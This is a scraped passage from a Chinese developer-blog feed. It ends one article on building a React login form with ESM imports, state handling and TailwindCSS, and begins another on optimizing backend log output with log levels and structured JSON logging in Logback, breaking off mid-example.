<p>这意味着如今只需按需引入所需 Hooks 或 API：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Lock</span>, <span class="hljs-title class_">Mail</span>, <span class="hljs-title class_">EyeOff</span>, <span class="hljs-title class_">Eye</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'lucide-react'</span>;
</code></pre>
<p>这种写法不仅更简洁，也更符合 <strong>按需引入（Tree Shaking）</strong> 的理念——只打包实际使用的代码，减少最终 bundle 体积。</p>
<hr/>
<h2 data-id="heading-1">二、ESM 与 CJS：懒加载的本质差异</h2>
<p>许多开发者误以为使用 ESM（<code>import</code> 语法）就天然具备“懒加载”能力。实际上，<strong>静态 <code>import</code> 并非懒加载</strong>。真正的懒加载（Lazy Loading）是指 <strong>仅在需要时才加载模块</strong>，这在大型应用中对首屏性能至关重要。</p>
<h3 data-id="heading-2">静态导入 vs 动态导入</h3>
<ul>
<li>
<p><strong>静态导入（Static Import）</strong> ：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> _ <span class="hljs-keyword">from</span> <span class="hljs-string">'lodash'</span>; <span class="hljs-comment">// 模块在构建时就被打包，随主 bundle 加载</span>
</code></pre>
<p>无论是否执行到相关逻辑，该模块都会被包含在初始资源中。</p>
</li>
<li>
<p><strong>动态导入（Dynamic Import）</strong> ：</p>
<pre><code class="hljs language-dart" lang="dart">button.addEventListener(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> _ = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'lodash'</span>);
  _.debounce(...);
});
</code></pre>
<p>此时，<code>lodash</code> 会被 Webpack 或 Vite 等构建工具拆分为独立 chunk，<strong>仅在用户点击按钮时才发起网络请求并执行</strong>。</p>
</li>
</ul>
<p>相比之下，CommonJS（CJS）的 <code>require()</code> 是同步且立即执行的，无法实现运行时按需加载。因此，<strong>ESM 的动态 <code>import()</code> 是实现真正懒加载的关键</strong>，这也是现代前端工程化推崇 ESM 的核心原因之一。</p>
<hr/>
<h2 data-id="heading-3">三、状态管理：单一状态对象 vs 多个 useState</h2>
<p>在登录表单中，通常涉及多个字段：邮箱、密码、是否记住我。传统做法可能是为每个字段声明一个 <code>useState</code>：</p>
<pre><code class="hljs language-scss" lang="scss">const <span class="hljs-selector-attr">[email, setEmail]</span> = <span class="hljs-built_in">useState</span>('');
const <span class="hljs-selector-attr">[password, setPassword]</span> = <span class="hljs-built_in">useState</span>('');
const <span class="hljs-selector-attr">[rememberMe, setRememberMe]</span> = <span class="hljs-built_in">useState</span>(false);
</code></pre>
<p>但随着字段增多，状态分散、更新逻辑重复的问题会逐渐显现。更优雅的方式是使用 <strong>单一状态对象</strong>：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">const</span> [formData, setFormData] = <span class="hljs-title function_ invoke__">useState</span>({
  <span class="hljs-attr">email</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">password</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">rememberMe</span>: <span class="hljs-literal">false</span>
});
</code></pre>
<p>配合一个通用的事件处理器：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">handleChange</span> = (e) =&gt; {
  const { name, value, type, checked } = e.target<span class="hljs-comment">;</span>
  setFormData(<span class="hljs-attr">prev</span> =&gt; ({
    ...prev,
    <span class="hljs-section">[name]</span>: <span class="hljs-attr">type</span> === <span class="hljs-string">'checkbox'</span> ? checked : value
  }))<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p>这里有几个关键点：</p>
<ol>
<li><strong><code>name</code> 属性作为状态键</strong>：HTML 表单元素的 <code>name</code> 与状态对象的 key 一一对应，实现自动映射。</li>
<li><strong>区分输入类型</strong>：通过 <code>type</code> 判断是否为复选框（<code>checkbox</code>），从而决定取 <code>value</code> 还是 <code>checked</code>。</li>
<li><strong>函数式更新</strong>：使用 <code>setFormData(prev =&gt; ...)</code> 确保状态基于最新值更新，避免闭包导致的 stale state 问题。</li>
</ol>
<p>这种抽象极大提升了代码的可扩展性——新增字段只需在初始状态中添加 key，无需修改事件处理逻辑。</p>
<hr/>
<h2 data-id="heading-4">四、UI 状态驱动：密码可见性切换</h2>
<p>密码输入框常提供“显示/隐藏”功能。其实现完全遵循 React 的 <strong>数据驱动视图</strong> 原则：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> [showPassword, setShowPassword] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);

<span class="hljs-comment">// 在 input 中动态设置 type</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">{showPassword</span> ? "<span class="hljs-attr">text</span>" <span class="hljs-attr">:</span> "<span class="hljs-attr">password</span>"} <span class="hljs-attr">...</span> /&gt;</span></span>

<span class="hljs-comment">// 切换按钮</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setShowPassword(!showPassword)}&gt;
  {showPassword ? <span class="hljs-tag">&lt;<span class="hljs-name">EyeOff</span> <span class="hljs-attr">size</span>=<span class="hljs-string">{18}</span> /&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">Eye</span> <span class="hljs-attr">size</span>=<span class="hljs-string">{18}</span> /&gt;</span>}
<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
</code></pre>
<p>图标库选用 <code>lucide-react</code>，它提供轻量、一致且可定制的 SVG 图标，完美契合现代 UI 设计。通过状态 <code>showPassword</code> 控制 <code>input</code> 的 <code>type</code> 和图标组件的渲染，整个交互逻辑清晰、无副作用。</p>
<hr/>
<h2 data-id="heading-5">五、TailwindCSS：声明式样式与响应式设计</h2>
<p>本例中的样式完全由 TailwindCSS 实现，其优势在于 <strong>原子化、组合式、响应式</strong> 的类名系统。</p>
<h3 data-id="heading-6">核心布局</h3>
<pre><code class="hljs language-scss" lang="scss">&lt;<span class="hljs-selector-tag">div</span> className="min-h-screen bg-slate-<span class="hljs-number">50</span> <span class="hljs-attribute">flex</span> items-center justify-center <span class="hljs-selector-tag">p</span>-<span class="hljs-number">4</span>"&gt;
</code></pre>
<ul>
<li><code>min-h-screen</code>：确保容器至少占满整个视口高度（100vh），避免内容过少时布局塌陷。</li>
<li><code>flex items-center justify-center</code>：水平垂直居中，经典登录页布局。</li>
<li><code>p-4</code>：移动端内边距；结合 <code>md:p-10</code> 实现 <strong>移动端优先（Mobile First）</strong> 的响应式策略。</li>
</ul>
<h3 data-id="heading-7">卡片容器</h3>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">div</span> className="max-w-md bg-white rounded-<span class="hljs-number">3</span>xl shadow-xl shadow-slate-<span class="hljs-number">200</span>/<span class="hljs-number">60</span> <span class="hljs-attribute">border</span>-slate-<span class="hljs-number">100</span> <span class="hljs-selector-tag">p</span>-<span class="hljs-number">8</span> md:p-<span class="hljs-number">10</span><span class="hljs-string">"&gt;
</span></code></pre>
<ul>
<li><code>max-w-md</code>：限制最大宽度，保证在大屏设备上不会过度拉伸。</li>
<li><code>shadow-xl shadow-slate-200/60</code>：使用带透明度的颜色（<code>/60</code> 表示 60% 不透明度），营造柔和阴影。</li>
<li><code>rounded-3xl</code>：大圆角提升现代感。</li>
</ul>
<h3 data-id="heading-8">表单间距与交互反馈</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"space-y-6"</span>&gt;</span> <span class="hljs-comment">&lt;!-- 子元素间垂直间距 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"focus:outline-none focus:ring-2 focus:ring-indigo-600/20 focus:border-indigo-600"</span> /&gt;</span>
</code></pre>
<ul>
<li><code>space-y-6</code>：自动为子元素添加 <code>margin-top</code>，避免手动设置间距。</li>
<li><code>focus:...</code>：聚焦时移除默认轮廓，并添加品牌色（indigo）的 ring 和 border，提升可访问性与视觉反馈。</li>
</ul>
<h3 data-id="heading-9">父子状态联动：<code>group</code> 与 <code>group-focus-within</code></h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"relative group"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"group-focus-within:text-indigo-600"</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">...</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>当 input 获得焦点时，其父级 <code>.group</code> 触发 <code>focus-within</code> 状态，进而使内部图标颜色变为品牌色。这种 <strong>状态穿透</strong> 能力是 TailwindCSS 强大伪类系统的体现。</p>
<hr/>
<h2 data-id="heading-10">六、未来扩展：加载状态与表单提交</h2>
<p>虽然当前 <code>handleSubmit</code> 为空，但已预留 <code>isLoading</code> 状态：</p>
<pre><code class="hljs language-scss" lang="scss">const <span class="hljs-selector-attr">[isLoading, setIsLoading]</span> = <span class="hljs-built_in">useState</span>(false);
</code></pre>
<p>在真实场景中，提交时应：</p>
<ol>
<li>设置 <code>setIsLoading(true)</code></li>
<li>调用登录 API</li>
<li>根据结果跳转或提示错误</li>
<li>最终 <code>setIsLoading(false)</code></li>
</ol>
<p>同时，可将提交按钮设为：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;button 
  <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> 
  <span class="hljs-attr">disabled</span>={isLoading}
  <span class="hljs-attr">className</span>=<span class="hljs-string">"... disabled:opacity-50 disabled:cursor-not-allowed"</span>
&gt;
  {isLoading ? '登录中...' : '登录'}
&lt;/button&gt;
</code></pre>
<p>利用 Tailwind 的 <code>disabled:</code> 变体自动应用禁用样式，提升用户体验。</p>
<hr/>
<h2 data-id="heading-11">结语</h2>
<p>一个看似简单的登录页面，实则蕴含了现代前端开发的诸多最佳实践：</p>
<ul>
<li><strong>模块化</strong>：通过 ESM 按需引入与动态导入优化加载性能；</li>
<li><strong>状态管理</strong>：以数据为中心，抽象通用逻辑；</li>
<li><strong>UI 工程</strong>：借助 TailwindCSS 实现声明式、响应式、状态驱动的样式；</li>
<li><strong>用户体验</strong>：受控组件、实时反馈、加载状态等细节打磨。</li>
</ul>
<p>这些技术并非孤立存在，而是相互协同，共同构建出高性能、高可维护性的现代 Web 应用。掌握其底层逻辑，方能在复杂业务中游刃有余。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[日志输出优化实战：从“能用”到“好用”的全攻略]]></title>    <link>https://juejin.cn/post/7591806035758923818</link>    <guid>https://juejin.cn/post/7591806035758923818</guid>    <pubDate>2026-01-06T07:59:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591806035758923818" data-draft-id="7591806035758907434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="日志输出优化实战：从“能用”到“好用”的全攻略"/> <meta itemprop="keywords" content="后端,分布式"/> <meta itemprop="datePublished" content="2026-01-06T07:59:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="回家路上绕了弯"/> <meta itemprop="url" content="https://juejin.cn/user/536217404587134"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            日志输出优化实战：从“能用”到“好用”的全攻略
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/536217404587134/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    回家路上绕了弯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:59:54.000Z" title="Tue Jan 06 2026 07:59:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">日志输出优化实战：从“能用”到“好用”的全攻略</h2>
<p>在日常开发中，日志是开发者的“眼睛”——排查问题、定位故障、监控系统状态，都离不开日志。但实际项目里，很多日志输出却处于“能用但不好用”的状态：要么级别混乱（ debug 日志充斥生产环境），要么内容残缺（缺少关键上下文），要么格式杂乱（难以解析），甚至因日志输出不当导致系统性能下降。今天，我们就从“为什么要优化日志”“优化什么”“怎么优化”三个维度，全面掌握日志输出的优化技巧，让日志真正成为系统运维的得力助手。</p>
<h3 data-id="heading-1">一、先搞懂：为什么要优化日志输出？</h3>
<p>很多开发者觉得“日志只要能打出来就行”，但在生产环境中，劣质日志的代价远超想象：</p>
<ul>
<li><strong>排查问题效率低</strong>：日志缺少请求ID、用户ID等上下文，面对海量日志无法快速定位某一次请求的完整链路；级别混乱导致关键错误日志被淹没在 debug 日志中；</li>
<li><strong>系统性能损耗大</strong>：无节制输出大量日志（尤其是 debug 级），会占用大量磁盘IO和网络带宽；同步日志写入在高并发场景下，还会拖慢接口响应速度；</li>
<li><strong>安全风险高</strong>：日志中明文输出用户密码、手机号、银行卡号等敏感信息，违反数据安全规范，可能引发合规风险；</li>
<li><strong>日志解析困难</strong>：非结构化日志（如自由文本）无法被ELK等日志分析工具高效解析，无法实现自动化监控告警，只能靠人工检索，效率极低。</li>
</ul>
<p>而优化后的日志，能实现“快速定位问题、低性能损耗、安全合规、可自动化分析”的目标，这也是分布式系统运维的基础要求。</p>
<h3 data-id="heading-2">二、日志输出优化的核心方向：6个“必须搞定”的关键点</h3>
<p>日志优化不是“炫技”，而是围绕“实用、高效、安全”展开的系统性优化。核心聚焦以下6个关键点，覆盖从输出规范到性能、安全的全维度：</p>
<h4 data-id="heading-3">1. 规范日志级别：不滥用、不混淆</h4>
<p>日志级别是日志的“优先级标签”，不同级别对应不同的使用场景，滥用级别会直接导致日志失效。主流日志框架（SLF4J+Logback/Log4j2）的级别从高到低分为：<code>ERROR &gt; WARN &gt; INFO &gt; DEBUG &gt; TRACE</code>，每个级别都有明确的使用边界：</p>
<ul>
<li><strong>ERROR</strong>：系统核心流程异常，必须人工介入处理。例如：数据库连接失败、第三方服务调用超时（无法重试）、核心业务逻辑异常（如订单创建失败）； 注意：只记录“异常事实”，不记录“预期内的失败”（如用户输入参数错误），且必须附带异常堆栈信息；</li>
<li><strong>WARN</strong>：系统出现非核心流程异常，但不影响主流程运行，需关注后续趋势。例如：缓存击穿、非核心接口调用超时（已重试成功）、配置项缺失（使用默认值）；</li>
<li><strong>INFO</strong>：系统核心流程的关键节点，用于追踪业务链路。例如：用户登录成功、订单支付完成、服务启动成功； 注意：INFO级别日志应“少而精”，避免每一步操作都打INFO，否则会导致日志冗余；</li>
<li><strong>DEBUG</strong>：开发/测试环境用于定位问题的详细信息，生产环境必须关闭。例如：方法入参出参、循环内的中间结果、第三方接口的详细响应；</li>
<li><strong>TRACE</strong>：比DEBUG更细致的调试信息（如框架内部调用细节），一般仅在框架调试时使用，业务代码尽量不使用。</li>
</ul>
<p>反例与正例对比：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 反例1：用ERROR记录预期内的失败（用户输入错误）</span>
if (StringUtils.isEmpty(userId)) {
    log<span class="hljs-selector-class">.error</span>("用户ID为空，无法查询订单"); <span class="hljs-comment">// 错误：用户输入错误属于预期内，应使用WARN</span>
    return Result<span class="hljs-selector-class">.fail</span>("用户ID不能为空");
}

<span class="hljs-comment">// 反例2：用INFO记录调试信息</span>
log<span class="hljs-selector-class">.info</span>("查询订单入参：orderNo={}", orderNo); <span class="hljs-comment">// 错误：入参记录属于调试信息，应使用DEBUG</span>
<span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = orderService<span class="hljs-selector-class">.getByOrderNo</span>(orderNo);

<span class="hljs-comment">// 正例</span>
if (StringUtils.isEmpty(userId)) {
    log<span class="hljs-selector-class">.warn</span>("用户ID为空，拒绝查询订单，请求参数：{}", requestParams); <span class="hljs-comment">// WARN记录预期内异常，附带参数</span>
    return Result<span class="hljs-selector-class">.fail</span>("用户ID不能为空");
}

try {
    <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = orderService<span class="hljs-selector-class">.getByOrderNo</span>(orderNo);
    log<span class="hljs-selector-class">.info</span>("订单查询成功，orderNo={}, userId={}", orderNo, userId); <span class="hljs-comment">// INFO记录核心流程节点</span>
} catch (Exception e) {
    log<span class="hljs-selector-class">.error</span>("订单查询失败，orderNo={}, userId={}", orderNo, userId, e); <span class="hljs-comment">// ERROR记录异常，附带堆栈</span>
    return Result<span class="hljs-selector-class">.fail</span>("查询失败");
}
</code></pre>
<h4 data-id="heading-4">2. 结构化日志：让日志“可解析、可检索”</h4>
<p>传统的“文本日志”（如 <code>2024-05-20 10:30:00.123 INFO [main] c.d.OrderController - 订单创建成功</code>）虽然人类可读，但机器难以解析，无法快速提取关键信息（如订单号、用户ID）。而<strong>结构化日志</strong>（如JSON格式）能将日志字段标准化，完美适配ELK（Elasticsearch+Logstash+Kibana）等日志分析工具，实现快速检索、过滤和可视化。</p>
<p>Spring Boot默认使用SLF4J+Logback，实现JSON结构化日志只需简单配置：</p>
<h5 data-id="heading-5">（1）引入依赖（若使用Logback）</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 日志JSON格式化依赖 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.logstash.logback<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>logstash-logback-encoder<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>7.4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h5 data-id="heading-6">（2）配置logback-spring.xml</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 上下文名称：区分不同服务 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">contextName</span>&gt;</span>order-service<span class="hljs-tag">&lt;/<span class="hljs-name">contextName</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 定义日志输出格式：JSON格式 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"CONSOLE"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"net.logstash.logback.encoder.LogstashEncoder"</span>&gt;</span>
            <span class="hljs-comment">&lt;!-- 固定字段：服务名、日志级别、时间戳等 --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">includeMdcKeyName</span>&gt;</span>requestId<span class="hljs-tag">&lt;/<span class="hljs-name">includeMdcKeyName</span>&gt;</span> <span class="hljs-comment">&lt;!-- 包含请求ID（链路追踪） --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">includeMdcKeyName</span>&gt;</span>userId<span class="hljs-tag">&lt;/<span class="hljs-name">includeMdcKeyName</span>&gt;</span>     <span class="hljs-comment">&lt;!-- 包含用户ID --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">customFields</span>&gt;</span>"service":"order-service","env":"prod"<span class="hljs-tag">&lt;/<span class="hljs-name">customFields</span>&gt;</span> <span class="hljs-comment">&lt;!-- 自定义固定字段 --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">fieldNames</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">timestamp</span>&gt;</span>timestamp<span class="hljs-tag">&lt;/<span class="hljs-name">timestamp</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">level</span>&gt;</span>level<span class="hljs-tag">&lt;/<span class="hljs-name">level</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>message<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">logger</span>&gt;</span>logger<span class="hljs-tag">&lt;/<span class="hljs-name">logger</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">thread</span>&gt;</span>thread<span class="hljs-tag">&lt;/<span class="hljs-name">thread</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">stack_trace</span>&gt;</span>stackTrace<span class="hljs-tag">&lt;/<span class="hljs-name">stack_trace</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">fieldNames</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 根日志级别：生产环境设为INFO --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">"INFO"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"CONSOLE"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 自定义包日志级别：如mapper层设为WARN，减少冗余 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">logger</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"com.demo.mapper"</span> <span class="hljs-attr">level</span>=<span class="hljs-string">"WARN"</span> <span class="hljs-attr">additivity</span>=<span class="hljs-string">"false"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"CONSOLE"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">logger</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>
</code></pre>
<h5 data-id="heading-7">（3）输出效果（JSON格式）</h5>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"service"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"order-service"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"env"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"prod"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"requestId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"req-20240520103000123"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"userId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1001"</span><span class="hljs-punctuation">,</span>
